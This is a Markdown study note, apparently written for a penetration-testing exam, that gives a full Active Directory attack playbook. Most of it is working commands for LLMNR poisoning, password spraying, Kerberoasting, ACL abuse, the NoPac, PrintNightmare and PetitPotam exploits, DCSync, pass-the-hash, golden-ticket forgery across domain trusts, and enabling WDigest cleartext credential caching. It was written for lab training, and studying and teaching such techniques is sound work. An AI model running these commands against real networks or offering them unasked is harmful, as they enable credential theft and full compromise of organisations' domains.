# NOTE — Active Directory Enumeration & Attacks Methodology (Exam Playbook)

## ID
709

## Module
Active Directory Enumeration & Attacks

## Kind
methodology

## Title
Active Directory Enumeration & Attacks — Full Pentest Methodology

## Description
End-to-end exam-ready playbook for internal AD compromise: external recon → initial internal enum → unauthenticated cred acquisition → credentialed enum → privilege escalation attacks → lateral movement → domain/forest compromise. Decision-tree first; commands drawn from this vault's own notes.

## Tags
methodology, active-directory, ad, exam, cheatsheet, decision-tree, kerberoasting, dcsync, acl-abuse, password-spraying, bloodhound, llmnr, petitpotam

---

## TL;DR — The 7-Phase Flow

1. **External recon** — domain, DNS, username format, breach data (passive only).
2. **Initial internal enum** — host discovery, DC identification, valid usernames via `kerbrute`.
3. **Acquire first creds (no auth needed)** — LLMNR/NBT-NS poisoning OR password spraying.
4. **Credentialed enum** — BloodHound, shares, security controls. **Re-run after every cred drop.**
5. **Privilege escalation attacks** — Kerberoasting, ACL chains, AS-REP roast, bleeding-edge CVEs.
6. **Lateral movement** — RDP / WinRM / SQLAdmin / PtH between hosts.
7. **Domain & forest compromise** — DCSync, child→parent ExtraSids, cross-forest Kerberoast.

> **Golden rule:** every time you get new creds, run BloodHound *first*, not 8th. ACL chains hide what scanners miss. And: re-recon every new host — never assume the next box is similar to the last.

> **OPSEC fork:** if AMSI / AppLocker / Defender block PowerShell tooling on a host, **don't waste time on bypasses** — pivot immediately to Linux-side equivalents (`bloodhound-python`, `net rpc`, `secretsdump.py`, `mssqlclient.py`). See Gotcha #1.

---

## Phase 1 — External Recon (no traffic to target infra)

**Goal:** identify domain, naming convention, leaked creds, exposed portals — before any active scan.

| Data to collect | Where / how |
|---|---|
| IP space (ASN, netblocks) | BGP Toolkit (`bgp.he.net`), IANA / ARIN / RIPE |
| DNS (A / MX / NS / TXT / SPF) | `dig any <DOMAIN>`, `dig txt`, `dig mx`, ViewDNS, PTRArchive |
| Email / username format | LinkedIn, contact pages, document metadata |
| Leaked creds | HaveIBeenPwned, Dehashed |
| Exposed portals | OWA, VPN, Citrix, RDS — try breach passwords here |
| Tech stack | Job postings, BuiltWith, Wappalyzer |

```bash
dig any inlanefreight.com
dig txt inlanefreight.com
dig mx inlanefreight.com
host -t txt inlanefreight.com
```

Detail: see `[[04-external-recon]]`.

---

## Phase 2 — Initial Internal Enumeration

**You have:** network access only, no creds.
**Goal:** map live hosts, locate DC(s), enumerate valid usernames.

```bash
# 1. Passive listener — see what hosts already speak
sudo responder -I ens224 -A             # analyze mode, NO poisoning yet
sudo tcpdump -i ens224 -w capture.pcap  # optional, parallel capture

# 2. ICMP sweep for live hosts
fping -asgq 172.16.5.0/23 2>/dev/null | head -n -14 > hosts.txt

# 3. Aggressive Nmap on live hosts (find DCs by port set)
sudo nmap -v -A -iL hosts.txt -oA host-enum
# DC fingerprint: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269

# 4. LDAP base query — confirms forest + names
ldapsearch -x -H ldap://172.16.5.5 -s base namingcontexts
# Presence of Configuration / Schema / ForestDNSZones = forest member

# 5. Validate usernames via Kerberos pre-auth (no event 4625 — stealth)
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 \
  /opt/wordlists/statistically-likely-usernames/jsmith.txt -o valid_ad_users
```

Detail: `[[05-initial-domain-enum]]`.

---

## Phase 3 — Acquire First Creds (No Auth Required)

**You have:** valid username list + network access.
**Pick branch by environment:**

### 3.A — LLMNR / NBT-NS Poisoning (broadcast networks)

**When:** clients use legacy name resolution (most internal nets).

```bash
sudo responder -I ens224                  # active poisoning
# Wait. Hashes land in /usr/share/responder/logs/

# Crack NTLMv2 offline
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# (NTLMv2 = 5600. NTLMv1 = 5500. NT-hash = 1000.)
```

Net-NTLMv2 **cannot** PtH — crack or relay. SMB Relay only works when SMB signing disabled.

Detail: `[[06-llmnr-nbtns-poisoning-linux]]`, Windows-side `[[07-llmnr-nbtns-poisoning-windows]]` (Inveigh).

### 3.B — Password Spraying (when LLMNR captures nothing)

```bash
# 1. ALWAYS pull password policy first (lockout = how aggressive you can be)
crackmapexec smb 172.16.5.5 --pass-pol                           # may need creds
rpcclient -U "" -N 172.16.5.5 -c "getdompwinfo"                  # null-session
enum4linux-ng -P 172.16.5.5 -oA policy

# 2. Build user list (multiple methods — pick what works)
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > valid_users.txt
rpcclient -U "" -N 172.16.5.5 -c "enumdomusers"
crackmapexec smb 172.16.5.5 --users
kerbrute userenum -d <DOMAIN> --dc <DC_IP> /opt/jsmith.txt

# 3. Spray (low-and-slow — one password against many users)
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid_users.txt Welcome1
crackmapexec smb <DC_IP> -u valid_users.txt -p 'Welcome1' | grep +

# 4. Local-admin hash reuse across a subnet
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <NT_HASH> | grep +
```

Common spray candidates: `Welcome1`, `Password1`, `Winter2024`, `<Season><Year>`, `<CompanyName>123`.

Detail: `[[08-password-spraying-overview]]`, `[[09-enumerating-password-policies]]`, `[[10-password-spraying-user-list]]`, `[[11-internal-password-spraying-linux]]`, `[[12-internal-password-spraying-windows]]`.

---

## Phase 4 — Credentialed Enumeration (Run This After Every New Cred Drop)

**You have:** at least one valid domain credential (cleartext, NTLM, or session).
**Goal:** map the domain so the attack path picks itself.

### 4.A — Security controls first (decide tool selection)

```powershell
Get-MpComputerStatus                                                 # Defender state
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode                          # Full / Constrained
Find-LAPSDelegatedGroups
Get-LAPSComputers                                                    # cleartext if you have rights
```

If Defender + AppLocker + ConstrainedLanguage are all on → pivot to Linux tools (Phase 4.B).
Detail: `[[13-enumerating-security-controls]]`.

### 4.B — From Linux (preferred when AMSI/Defender suspected)

```bash
# Users / groups / shares / sessions
sudo crackmapexec smb <DC_IP> -u <U> -p <P> --users --groups --shares --loggedon-users
# (Pwn3d!) on --loggedon-users = your user is local admin on that host.

# Share crawl for creds (web.config, scripts, KeePass)
crackmapexec smb <DC_IP> -u <U> -p <P> -M spider_plus --share 'Department Shares'
# JSON dumped to /tmp/cme_spider_plus/<IP>.json
smbmap -u <U> -p <P> -d <DOMAIN> -H <DC_IP> -R 'Department Shares' -A web.config

# Full domain ingestion → BloodHound
sudo bloodhound-python -u '<U>' -p '<P>' -ns <DC_IP> -d <DOMAIN> -c all
# Drag JSON/ZIPs into BloodHound GUI. Run pre-built queries.
```

### 4.C — From Windows

```powershell
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # Kerberoast targets
Get-ADTrust -Filter *                                                                     # trusts
Get-ADGroupMember -Identity "Domain Admins"

# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Test-AdminAccess -ComputerName <HOST>

# SharpHound + Snaffler
.\SharpHound.exe -c All --zipfilename audit
.\Snaffler.exe -d <DOMAIN> -s -v data -o snaffler.log    # red = high value
```

Detail: `[[14-credentialed-enum-linux]]`, `[[15-credentialed-enum-windows]]`, `[[16-living-off-the-land]]`.

### BloodHound pre-built queries to ALWAYS run

- List all Kerberoastable Accounts
- Find AS-REP Roastable Users (DontReqPreAuth)
- Find Computers where Domain Users are Local Admin / can RDP / can PSRemote
- Shortest Paths to Domain Admins from Owned Principals
- Map Domain Trusts

---

## Phase 5 — Privilege Escalation Attacks

Pick by what BloodHound / enum revealed.

### 5.A — Kerberoasting (any domain user)

```bash
# Linux — enumerate then request
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_USER> -outputfile tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt --force   # --force on HTB lab VMs

# Windows — Rubeus is fastest
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /user:<SPN_USER> /nowrap
.\Rubeus.exe kerberoast /tgtdeleg /nowrap                            # RC4 downgrade (pre-2019 DC only)
```

Always check `MemberOf` before cracking — chase Account Operators / Domain Admins first.
Mode 13100 = RC4 TGS (fast). Mode 19700 = AES-256 (~70× slower).
Detail: `[[17-kerberoasting-linux]]`, `[[18-kerberoasting-windows]]`.

### 5.B — ACL Abuse Chain (the "hidden path")

**Trigger:** stuck after Kerberoast + spray; BloodHound shows outbound control edges.

```powershell
# Discover what your user controls
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid <YOUR_USER>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# REPEAT for every user you compromise → chain it.
```

| ACE | Abuse | Tool |
|---|---|---|
| ForceChangePassword | Reset target's password | `Set-DomainUserPassword` / `pth-net rpc password` |
| GenericWrite (user) | Set fake SPN → targeted Kerberoast | `Set-DomainObject -SET @{serviceprincipalname='fake/SPN'}` + Rubeus |
| GenericWrite (group) | Add yourself to group | `Add-DomainGroupMember` / `net rpc group addmem` |
| GenericAll | All of the above + read LAPS | various |
| WriteDACL | Grant yourself GenericAll → cascades | `Add-DomainObjectACL` |
| AllExtendedRights | ForceChangePwd + AddMember + ReadLAPS + DCSync | various |

**Cleanup order matters** (do this exact sequence):
1. Remove fake SPN.
2. Remove user from group.
3. Reset password (last, if you forced-changed it).

Reversing the order = you lose rights to clean up the SPN.

Detail: `[[19-acl-abuse-primer]]`, `[[20-acl-enumeration]]`, `[[21-acl-abuse-tactics]]`.

### 5.C — Bleeding-Edge CVEs (when unpatched)

| Attack | Precondition | One-liner trigger |
|---|---|---|
| **NoPac** (CVE-2021-42278/42287) | `ms-DS-MachineAccountQuota >= 1`, unpatched DC | `python3 noPac.py <DOM>/<U>:<P> -dc-ip <IP> -dc-host <DC> -shell --impersonate administrator -use-ldap` |
| **PrintNightmare** (CVE-2021-1675) | Print Spooler exposed, unpatched DC | Generate DLL → smbserver → `python3 CVE-2021-1675.py <DOM>/<U>:<P>@<DC> '\\<ME>\share\p.dll'` |
| **PetitPotam** | AD CS with Web Enrollment, NTLM allowed | T1: `ntlmrelayx.py --target http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController` T2: `python3 PetitPotam.py <ME> <DC>` |

PetitPotam is **unauthenticated** — works with zero creds.
After PetitPotam captures cert → `gettgtpkinit.py` → `KRB5CCNAME=...` → `secretsdump.py -k -no-pass`.
Detail: `[[25-bleeding-edge-vulnerabilities]]`.

---

## Phase 6 — Lateral Movement

After every new cred: check non-admin execution rights too. Local admin isn't the only ticket.

```powershell
# Who can RDP / WinRM / SQL on which hosts?
Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Management Users"
Get-SQLInstanceDomain          # PowerUpSQL
```

```bash
# Linux execution
evil-winrm -i <IP> -u <U> -p '<P>'                       # WinRM
evil-winrm -i <IP> -u <U> -H <NT_HASH>                   # PtH
xfreerdp /u:<U> /p:'<P>' /v:<IP> /cert-ignore /dynamic-resolution
psexec.py <DOMAIN>/<U>:'<P>'@<IP>                        # noisy, SYSTEM
wmiexec.py <DOMAIN>/<U>:'<P>'@<IP>                       # stealthier, user-context
mssqlclient.py <DOMAIN>/<U>@<IP> -windows-auth           # then: enable_xp_cmdshell; xp_cmdshell whoami /priv
```

SQL sysadmin → SeImpersonatePrivilege → SYSTEM (PrintSpoofer / JuicyPotato / **Meterpreter `getsystem`** as fallback if Potatoes aren't on disk).

**WinRM double-hop trap:** WinRM doesn't forward your TGT, so PowerView from a WinRM shell fails against the DC. Two fixes: (1) PSCredential object passed to every cmdlet, or (2) `Register-PSSessionConfiguration` with `RunAsCredential`.
Detail: `[[23-privileged-access]]`, `[[24-winrm-double-hop-kerberos]]`.

---

## Phase 7 — Domain & Forest Compromise

### 7.A — DCSync (when you have replication rights)

Confirm rights:
```powershell
Get-ObjectAcl "DC=<DOMAIN>,DC=<TLD>" -ResolveGUIDs | ? { $_.ObjectAceType -match 'Replication-Get'} | ?{$_.SecurityIdentifier -match $sid}
```

```bash
# Linux — single command
secretsdump.py -outputfile dump -just-dc <DOMAIN>/<U>@<DC_IP>
# Outputs: dump.ntds (NTLM), dump.ntds.kerberos (keys), dump.ntds.cleartext (reversible-encryption pwds)
grep <USER> dump.ntds                                    # one user's NT hash

# Windows — Mimikatz
runas /netonly /user:<DOMAIN>\<U> powershell
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\administrator
```

Then PtH the krbtgt or admin hash:
```bash
evil-winrm -i <DC_IP> -u administrator -H <NT_HASH>
```

Detail: `[[22-dcsync]]`.

### 7.B — Child → Parent Domain (ExtraSids Golden Ticket)

```bash
# 1. DCSync child KRBTGT
secretsdump.py <CHILD>/<DA>@<CHILD_DC> -just-dc-user <CHILD>/krbtgt

# 2. Get SIDs
lookupsid.py <CHILD>/<DA>@<CHILD_DC>  | grep "Domain SID"            # CHILD_SID
lookupsid.py <CHILD>/<DA>@<PARENT_DC> | grep -B12 "Enterprise Admins" # PARENT_SID + EA RID 519

# 3. Forge Golden Ticket (EA SID = PARENT_SID-519)
ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD> -domain-sid <CHILD_SID> \
  -extra-sid <PARENT_SID-519> hacker
export KRB5CCNAME=hacker.ccache

# 4. Use it
secretsdump.py hacker@<PARENT_DC_FQDN> -k -no-pass -target-ip <PARENT_DC_IP> \
  -just-dc-user <PARENT>/administrator

# Or one-shot automation:
raiseChild.py -target-exec <PARENT_DC_IP> <CHILD>/<DA_USER>
```

Detail: `[[27-domain-trusts-primer]]`, `[[29-domain-trusts-child-to-parent-linux]]`.

### 7.C — Cross-Forest Kerberoast

```bash
GetUserSPNs.py -target-domain <OTHER_FOREST> <CURRENT>/<USER> -request -outputfile xforest.tgs
hashcat -m 13100 xforest.tgs /usr/share/wordlists/rockyou.txt
# Then BloodHound across both — collect from each separately, edit /etc/resolv.conf between runs
bloodhound-python -d <OTHER_FOREST> -dc <OTHER_DC_FQDN> -c All -u <USER>@<CURRENT> -p '<PASS>'
```

After crack: **always try password reuse** against the original forest — same admins often set the same passwords across trust boundaries.
Detail: `[[31-cross-forest-trust-abuse-linux]]`.

---

## Decision Tree (Under Exam Pressure)

```
You have:
│
├── nothing (just an IP / scope)
│   └── Phase 1 (external) → Phase 2 (internal recon)
│
├── network access, no creds
│   ├── LLMNR likely on subnet → responder -I <iface>
│   │   └── got hash → hashcat -m 5600 → cleartext
│   ├── usernames known → password spray (Welcome1, <Season><Year>)
│   ├── nothing biting → PetitPotam (works UNAUTH if AD CS present)
│   └── still stuck → re-recon: full TCP, UDP top, LDAP anon bind, SNMP, NULL session
│
├── ONE domain user (cleartext or NT hash)
│   ├── ALWAYS FIRST → bloodhound-python -c all → check pre-built queries
│   ├── Kerberoast every SPN account (-request)
│   ├── AS-REP roast users with DontReqPreAuth
│   ├── Spider shares (spider_plus / smbmap -R / snaffler) — web.config, KeePass
│   ├── Check Outbound Control Rights in BH → ACL chain
│   └── Check (Pwn3d!) on CME --loggedon-users → instant lateral
│
├── LOCAL ADMIN on a box
│   ├── secretsdump.py @localhost OR mimikatz sekurlsa::logonpasswords
│   ├── lsa_dump_sam (meterpreter+kiwi) → other admin hashes
│   ├── Spray that hash across subnet (--local-auth)
│   └── If on DC → DCSync everyone
│
├── USER WITH ACL EDGE
│   ├── ForceChangePassword → reset target → re-auth as them
│   ├── GenericAll/Write on user → set fake SPN → Rubeus kerberoast → crack
│   ├── GenericAll/Write on group → add yourself → check nested memberof
│   ├── WriteDACL on domain → grant yourself DCSync ACEs → secretsdump
│   └── CLEANUP: SPN first, group second, password last
│
├── SeImpersonatePrivilege (SQL service / web app)
│   ├── PrintSpoofer / GodPotato / JuicyPotato → SYSTEM
│   └── Fallback: Meterpreter getsystem (built-in SeImpersonate exploit)
│
├── DOMAIN ADMIN / DCSync rights
│   ├── secretsdump -just-dc → full NTDS → PtH admin to all hosts
│   ├── Check for child domains → ExtraSids Golden Ticket to parent
│   └── Check for forest trusts → cross-forest Kerberoast
│
└── STUCK > 30 min
    ├── grep ATTACK-PATHS.md for current state
    ├── Re-enumerate the last host (creds in bash_history? /etc/? scripts?)
    ├── BloodHound: Owned Principals → Shortest Paths to High Value
    └── If AMSI killed your tool → pivot to Linux equivalent (see Gotcha #1)
```

---

## Signal → Counter-Move Reference

| You see / observe | Likely cause | Counter-move |
|---|---|---|
| `Import-Module .\PowerView.ps1` succeeds but every cmdlet returns nothing | **AMSI silently stripped functions** | Don't fight AMSI — `bloodhound-python` / `net rpc` / `secretsdump.py` from Linux |
| `Set-DomainObject` → "Access is denied" right after `Add-DomainGroupMember` | Kerberos token hasn't refreshed group membership | Re-auth (close + reopen PS), or remove + re-add user |
| CME `--users` shows `badpwdcount: 4` of 5 | Account near lockout | **Skip it** — spraying locks it out |
| Spray shows `[+]` but `(Pwn3d!)` absent | Valid creds, no local admin on that host | Check other hosts via `--loggedon-users` and BloodHound `CanRDP` / `CanPSRemote` |
| `rpcclient` spray loop returns no output | Successes need grep `Authority` | `... | grep Authority` — silence = failure |
| `evil-winrm` succeeds but `Enter-PSSession` to DC fails inside it | **WinRM double-hop** — no TGT forwarded | Use PSCredential per cmdlet, OR re-auth from Windows attack VM |
| Hashcat: "no devices found" | HTB lab VM OpenCL quirk | `--force`, or fall back to `john --format=krb5tgs` |
| `noPac.py` fails with "Add Computer failed" | `ms-DS-MachineAccountQuota = 0` | NoPac dead — pivot to PetitPotam / ACL chain |
| `secretsdump.py` cleartext file is empty | No accounts have reversible encryption | That's normal, not failure — `.ntds` still has hashes |
| `/tgtdeleg` returns AES tickets anyway | DC is Server 2019+ | No RC4 downgrade — crack the AES (slow) or skip user |
| Meterpreter `getsystem` says "operation failed" | Wrong context | Must be at `meterpreter>` prompt (NOT `msf6>` or `C:\>`); type `exit` from shell |
| Reverse shell hangs forever | **Listener not running before payload fired** | Always start handler FIRST, then trigger payload |
| `bloodhound-python` "unauthorized" with local admin hash | Needs DOMAIN creds, not local | Use a domain user (even unprivileged) |
| LDAP `data 52e` error | Wrong creds OR auth'd as local Linux user | `htb-student` ≠ domain user — use `forend / Klmcargo2` etc. |
| `Invoke-Command` to DC → "Access is denied" | User has no WinRM rights | `net rpc group addmem` from Linux instead |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === Scenario 1: Cold start, network only ===
sudo tcpdump -i ens224 -w cap.pcap &
fping -asgq 172.16.5.0/23 > hosts.txt
sudo nmap -v -A -iL hosts.txt -oA host-enum
kerbrute userenum -d <DOMAIN> --dc <DC_IP> /opt/jsmith.txt -o users.txt

# === Scenario 2: LLMNR poisoning → crack ===
sudo responder -I ens224
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# === Scenario 3: Spray with policy awareness ===
crackmapexec smb <DC> --pass-pol                             # see lockout threshold
crackmapexec smb <DC> --users | tee users.txt
cat users.txt | cut -d'\' -f2 | awk '{print $1}' > valid_users.txt
kerbrute passwordspray -d <DOMAIN> --dc <DC> valid_users.txt 'Welcome1'

# === Scenario 4: One cred → run BloodHound FIRST ===
sudo bloodhound-python -u '<U>' -p '<P>' -ns <DC_IP> -d <DOMAIN> -c all
# Upload to BH GUI, run pre-built queries.

# === Scenario 5: Kerberoast every roastable ===
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<U> -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt --force

# === Scenario 6: ACL chain (FCP → GW → GA → fake SPN) ===
$Cred = New-Object System.Management.Automation.PSCredential('<DOM>\<U>',(ConvertTo-SecureString '<P>' -AsPlainText -Force))
Set-DomainUserPassword -Identity <TARGET> -AccountPassword (ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force) -Credential $Cred
Add-DomainGroupMember -Identity '<GROUP>' -Members '<U>' -Credential $Cred
Set-DomainObject -Identity <VICTIM> -SET @{serviceprincipalname='fake/SPN'} -Credential $Cred
.\Rubeus.exe kerberoast /user:<VICTIM> /nowrap
# Cleanup: clear SPN → remove from group → reset password

# === Scenario 7: DCSync (you have replication rights) ===
secretsdump.py -outputfile dump -just-dc <DOMAIN>/<U>@<DC_IP>
grep administrator dump.ntds                                 # NT hash → PtH

# === Scenario 8: Pass-the-Hash everywhere ===
evil-winrm -i <IP> -u administrator -H <NT_HASH>
psexec.py <DOMAIN>/administrator@<IP> -hashes :<NT_HASH>
crackmapexec smb <SUBNET> --local-auth -u administrator -H <NT_HASH>

# === Scenario 9: AMSI killed your PowerShell — pivot to Linux ===
sudo bloodhound-python -d <DOM> -u <U> -p '<P>' -ns <DC_IP> -c Acl --zip
grep -i "GenericAll" *groups.json
rpcclient -U '<U>%<P>' <DC_IP> -c "lookupsids <SID>"
net rpc group addmem "Domain Admins" "<U>" -U '<DOM>/<U>%<P>' -S <DC_IP>

# === Scenario 10: Child → Parent (ExtraSids) ===
secretsdump.py <CHILD>/<DA>@<CHILD_DC> -just-dc-user <CHILD>/krbtgt
lookupsid.py <CHILD>/<DA>@<CHILD_DC> | grep "Domain SID"
lookupsid.py <CHILD>/<DA>@<PARENT_DC> | grep -B12 "Enterprise Admins"
ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD> -domain-sid <CHILD_SID> -extra-sid <PARENT-519> hacker
export KRB5CCNAME=hacker.ccache
secretsdump.py hacker@<PARENT_FQDN> -k -no-pass -target-ip <PARENT_IP> -just-dc-user <PARENT>/administrator

# === Scenario 11: PetitPotam (UNAUTH if AD CS) ===
# Terminal 1:
sudo ntlmrelayx.py -smb2support --target http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController
# Terminal 2:
python3 PetitPotam.py <ME_IP> <DC_IP>
# Catch cert, then:
python3 gettgtpkinit.py <DOMAIN>/<DC>\$ -pfx-base64 <CERT> dc.ccache
export KRB5CCNAME=dc.ccache
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass <DC_FQDN>
```

---

## Quick Reference — Tools by Function

| Function | Linux | Windows |
|---|---|---|
| Host discovery | `fping`, `nmap` | `nmap`, `arp -a`, `route print` |
| LLMNR poisoning | `responder` | `Inveigh` (C#/PS) |
| User enum (no auth) | `kerbrute userenum`, `rpcclient -U "" -N`, `enum4linux-ng` | `net user /domain`, `dsquery` |
| Password policy | `crackmapexec --pass-pol`, `rpcclient getdompwinfo` | `net accounts`, `Get-DomainPolicy` |
| Spraying | `kerbrute passwordspray`, `crackmapexec`, `rpcclient` loop | `DomainPasswordSpray.ps1` |
| Credentialed enum | `crackmapexec`, `smbmap`, `windapsearch`, `bloodhound-python` | `ActiveDirectory` module, `PowerView`, `SharpHound`, `Snaffler` |
| Share crawl | `crackmapexec -M spider_plus`, `smbmap -R` | `Snaffler` |
| Kerberoast | `GetUserSPNs.py` | `Rubeus.exe kerberoast`, `PowerView Get-DomainSPNTicket` |
| ACL exploit | `pth-net rpc`, `net rpc group addmem`, `targetedKerberoast.py` | `PowerView Set-DomainObject` / `Add-DomainGroupMember` / `Add-DomainObjectACL` |
| DCSync | `secretsdump.py -just-dc` | `mimikatz lsadump::dcsync` |
| Cred dump (local) | `secretsdump.py local` | `mimikatz sekurlsa::logonpasswords`, `kiwi lsa_dump_sam` |
| Lateral exec | `evil-winrm`, `psexec.py`, `wmiexec.py`, `mssqlclient.py`, `xfreerdp` | `Enter-PSSession`, `Invoke-Command`, `PsExec.exe` |
| Trust enum | `bloodhound-python` | `Get-ADTrust`, `Get-DomainTrust`, `netdom query` |
| Cracking | `hashcat -m 5600/13100/19700/1000`, `john --format=krb5tgs` | (rare on Windows attack host) |
| Forge ticket | `ticketer.py`, `getTGT.py` | `mimikatz kerberos::golden` |
| Pivoting | `chisel`, `ligolo-ng`, `sshuttle`, SOCKS + `proxychains` | `netsh portproxy`, `chisel.exe`, meterpreter `portfwd` |

Hashcat modes you need: **5600** (NTLMv2), **13100** (TGS-REP RC4), **19700** (TGS-REP AES-256), **18200** (AS-REP RC4), **1000** (NT hash).

---

## Top Gotchas (Things That Will Burn You)

1. **AMSI on HTB / hardened boxes silently kills PowerView** — `Import-Module` succeeds, every cmdlet returns nothing. Don't burn an hour on AMSI bypasses (Bypass-4MSI often crashes Evil-WinRM). **Pivot to Linux tools immediately**: `bloodhound-python`, `net rpc`, `secretsdump.py`, `mssqlclient.py`. This is the #1 lesson from the Skills Assessment Part II chain.
2. **Listener BEFORE payload, always.** Reverse shell that never connects = listener wasn't running yet. `msfconsole → run` *then* trigger `shell.exe`.
3. **Meterpreter `getsystem` context.** Only works at `meterpreter>`. At `msf6>` you have no session. At `C:\>` you're in a cmd shell — `exit` back to meterpreter first.
4. **ACL chain cleanup order:** clear fake SPN → remove from group → reset password. Reverse it and you lose the rights to undo the SPN.
5. **`--local-auth` on CME when spraying local-admin hashes.** Omit it and CME tries domain auth → locks the built-in domain Administrator.
6. **WinRM double-hop:** PowerView from `evil-winrm` shell can't talk to the DC because no TGT was forwarded. Pass `-Credential $Cred` to every cmdlet, or use `Register-PSSessionConfiguration`.
7. **bloodhound-python needs DOMAIN creds, not local admin hashes.** A local admin hash works for evil-winrm/PtH, but BH ingestion will fail with "unauthorized."
8. **Kerbrute pre-auth is stealth on *enumeration only*.** Once you switch to `passwordspray`, failed pre-auth DOES count toward lockout. Stealth ends at spray.
9. **Filter computer accounts (ending in `$`)** out of user lists before spraying — they don't authenticate the same way and skew lockout counters.
10. **`rpcclient` spray success has no positive output** — must `grep Authority`. Silence = failure, not success.
11. **`-ResolveGUIDs` always on `Get-DomainObjectACL`** — without it, ACE types are raw GUIDs you have to look up manually.
12. **Server 2019+ DCs ignore `/tgtdeleg`** — you'll always get AES-256 tickets, no RC4 downgrade. Crack mode 19700 takes ~70× longer than 13100.
13. **NoPac dies if `ms-DS-MachineAccountQuota = 0`** — common in hardened envs. Check before running with `scanner.py`.
14. **PetitPotam needs TWO terminals running simultaneously** — `ntlmrelayx` first, then trigger with `PetitPotam.py`. Easy to forget.
15. **PetitPotam works UNAUTHENTICATED** — don't skip it just because you "don't have creds yet."
16. **`runas /netonly` is misleading** — local file access still runs as your current user. Only network auth uses the supplied creds.
17. **Mimikatz `sekurlsa::logonpasswords` blank?** WDigest disabled by default on modern Windows. Re-enable with `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1` + reboot, then re-login and re-run.
18. **`/etc/resolv.conf` resets on reboot.** If `bloodhound-python` against a second forest fails resolution, your nameservers reverted.
19. **`KRB5CCNAME` must be exported** before any Impacket Kerberos op — `psexec.py -k -no-pass` reads from that env var.
20. **Always FQDN, never IP, when `-k`** — Kerberos needs hostname for SPN matching. `evil-winrm -i 10.10.10.10` is fine; `secretsdump -k 10.10.10.10` is not.
21. **`(Pwn3d!)` ≠ `[+]`.** Plain `[+]` from CME = valid creds. `(Pwn3d!)` = local admin on that host. Don't conflate them.
22. **`admincount=1` ≠ currently privileged.** It means the user *was* in a protected group — AdminSDHolder ACL may still apply. Still juicy.
23. **`net rpc` from Linux replaces "add to Domain Admins"** when WinRM/PSRemoting is blocked. The Phase 9 of Skills Assessment II hinges on this.
24. **HTB lab VMs may need `hashcat --force`** due to OpenCL driver quirks. Or fall back to `john --format=krb5tgs`.
25. **Document credentials and changes as you go.** Format: `proto://user:pass@host (source: where found)`. The exam grades the **chain**, not the boxes — your report needs every step.

---

## Related Vault Notes

- `[[01-intro-to-ad]]` — AD theory
- `[[02-tools-of-the-trade]]` — tool reference
- `[[03-scenario]]` — RoE / scope
- `[[04-external-recon]]` — OSINT, DNS, breach data
- `[[05-initial-domain-enum]]` — passive capture, fping, nmap, kerbrute
- `[[06-llmnr-nbtns-poisoning-linux]]` — Responder
- `[[07-llmnr-nbtns-poisoning-windows]]` — Inveigh
- `[[08-password-spraying-overview]]` — concept
- `[[09-enumerating-password-policies]]` — lockout / minPwdLength
- `[[10-password-spraying-user-list]]` — user enum methods
- `[[11-internal-password-spraying-linux]]` — kerbrute / CME spray
- `[[12-internal-password-spraying-windows]]` — DomainPasswordSpray.ps1
- `[[13-enumerating-security-controls]]` — Defender / AppLocker / LAPS / language mode
- `[[14-credentialed-enum-linux]]` — CME / smbmap / rpcclient / Impacket / windapsearch / bloodhound-python
- `[[15-credentialed-enum-windows]]` — ActiveDirectory module / PowerView / SharpHound / Snaffler
- `[[16-living-off-the-land]]` — net / wmic / dsquery / LDAP filters
- `[[17-kerberoasting-linux]]` — GetUserSPNs.py
- `[[18-kerberoasting-windows]]` — Rubeus / PowerView / Mimikatz
- `[[19-acl-abuse-primer]]` — DACL / ACE / GenericAll / WriteDACL theory
- `[[20-acl-enumeration]]` — Get-DomainObjectACL chains
- `[[21-acl-abuse-tactics]]` — ForceChangePassword → GenericWrite → GenericAll chain, cleanup order
- `[[22-dcsync]]` — secretsdump.py / Mimikatz lsadump::dcsync
- `[[23-privileged-access]]` — RDP / WinRM / SQLAdmin
- `[[24-winrm-double-hop-kerberos]]` — TGT forwarding fix
- `[[25-bleeding-edge-vulnerabilities]]` — NoPac / PrintNightmare / PetitPotam
- `[[27-domain-trusts-primer]]` — trust types, direction, transitivity
- `[[29-domain-trusts-child-to-parent-linux]]` — ExtraSids Golden Ticket from Linux
- `[[31-cross-forest-trust-abuse-linux]]` — cross-forest Kerberoast
- `[[32-hardening-active-directory]]` — defender's view (for report remediation)
